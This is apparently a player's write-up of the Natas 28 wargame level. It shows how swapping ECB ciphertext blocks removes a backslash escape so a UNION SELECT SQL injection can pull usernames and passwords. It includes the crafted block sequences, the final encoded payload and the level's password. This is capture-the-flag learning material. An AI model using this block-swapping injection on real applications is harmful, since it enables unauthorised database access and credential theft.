+	Block: 3 data 8816c61e2bc6372660f879c45f23777e 
+	Block: 4 data a09522f301cf9d36ac7023f165948c5a
+	Block: 5 data 9739cd90522fa7a86f95773b56f9f8c0
+	Input length 10 Response length(hex): 160
+	=================================================================
+	Block: 1 data 1be82511a7ba5bfd578c0eef466db59c
+	Block: 2 data dc84728fdcf89d93751d10a7c75c8cf2
+	Block: 3 data 5f22a727f625419a466f9af53891f9b2 xxxxxxAAAAAAAAAA
+	Block: 4 data 738a5ffb4a4500246775175ae596bbd6
+	Block: 5 data f34df339c69edce11f6650bbced62702
+	Input length 11 Response length(hex): 160
+	=================================================================
+	Block: 1 data 1be82511a7ba5bfd578c0eef466db59c
+	Block: 2 data dc84728fdcf89d93751d10a7c75c8cf2
+	Block: 3 data 5f22a727f625419a466f9af53891f9b2 AAAAAAAAAA
+	Block: 4 data 36336947ddff073d132c22391e655108 A
+	Block: 5 data ca8cf4e610913abae39a067619204a5a
+	Input length 12 Response length(hex): 160
+	=================================================================
+	Block: 1 data 1be82511a7ba5bfd578c0eef466db59c
+	Block: 2 data dc84728fdcf89d93751d10a7c75c8cf2
+	Block: 3 data 5f22a727f625419a466f9af53891f9b2 AAAAAAAAAA
+	Block: 4 data 87527d43773398c6ef1f114a513a0028 AA
+	Block: 5 data 75fd5044fd063d26f6bb7f734b41c899
+	=================================================================
+
+	This tells us that this is Electronic Code Book (ECB) block encryption cipher.
+	This cipher uses the same key to encrypt every block.
+	So we have the same block(3rd) which has 10 A's but after 6 wildcards because if the input is 11A's then it is added to a new block. But the block with 10 A's remains the same i.e, the third block.
+
+	"Upon giving the input as a double quote("") or single quote('') the database shows up data with the double quotes"
+
+	This means that the input is being sanitized by providing a back slash to the double quote. (\'') escaping the double quote.
+
+
+	As we already know that 10A's is 5f22a727f625419a466f9af53891f9b2
+
+	We will give the input as 9A's and give a single quote(') so that it gets escaped by a back slash and the single quote goes to a new line
+
+	AAAAAAAAA\ block
+	'		another block
+
+	"IMPORTANT STEP"
+		As we already know that block consisting of 10A's we will replace the block containing a back slash with the block containing 10A's.
+
+		And then we can perform sql injection.
+
+	The input given is AAAAAAAAA'union select username from users#; (as we already know fom previous challanges)
+
+		Input length 10 Response length(hex): 256
+		=================================================================
+		Block: 1 data 1be82511a7ba5bfd578c0eef466db59c
+		Block: 2 data dc84728fdcf89d93751d10a7c75c8cf2
+		Block: 3 data 16276a702e32b177475d890ddad5ce65 xxxxxxAAAAAAAAA\
+		Block: 4 data e3c7810ec5d10a1fb6cd8ea9b2ccf0e4 'union select...
+		Block: 5 data 9975ddaa8840077101561f38a4c01611
+		Block: 6 data 7db7e5f470ba5edb8aff41ef75120d6f
+		Block: 7 data 6486954aea46fb93e9ab85845b4f4bd0
+		Block: 8 data d7ff2b725453fc294701e51f5d7c0f8e
+
+	Now we will replace the third block with 5f22a727f625419a466f9af53891f9b2 (block with 10A's)
+
+
+	So this becomes
+
+	Block: 1 data 1be82511a7ba5bfd578c0eef466db59c
+	Block: 2 data dc84728fdcf89d93751d10a7c75c8cf2
+	Block: 3 data 5f22a727f625419a466f9af53891f9b2 xxxxxxAAAAAAAAAA
+	Block: 4 data e3c7810ec5d10a1fb6cd8ea9b2ccf0e4 'union select
+	Block: 5 data 9975ddaa8840077101561f38a4c01611
+	Block: 6 data 7db7e5f470ba5edb8aff41ef75120d6f
+	Block: 7 data 6486954aea46fb93e9ab85845b4f4bd0
+	Block: 8 data d7ff2b725453fc294701e51f5d7c0f8e
+
+
+	Lets do from hex, base64-encode, url-encode this and give this as a query param in search.php
+	The query return the name as natas29
+
+	Now lets find the password
+
+	The input given is AAAAAAAAA'union select password from users#; (as we already know fom previous challanges)
+
+
+	1be82511a7ba5bfd578c0eef466db59c
+	dc84728fdcf89d93751d10a7c75c8cf2
+	5f22a727f625419a466f9af53891f9b2
+	5661930eeb7fdf14027d5b900ed1cec6
+	b678f4a5c38072de4ab3eb6c6482b1f3
+	57b54557579c2ad67bde632dfccf2900
+	6223a14d9c4291b98775b03fbc73d4ed
+	d8ae51d7da71b2b083d919a0d7b88b98
+
+	after hex encode, base64-encode, url-encoding
+		G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyVmGTDut%2F3xQCfVuQDtHOxrZ49KXDgHLeSrPrbGSCsfNXtUVXV5wq1nveYy38zykAYiOhTZxCkbmHdbA%2FvHPU7diuUdfacbKwg9kZoNe4i5g%3D
+
+	pass this as a param in search.php
+
+	The password for natas29 is: airooCaiseiyee8he8xongien9euhe8b
+
+
+
+Natas 29:
+	
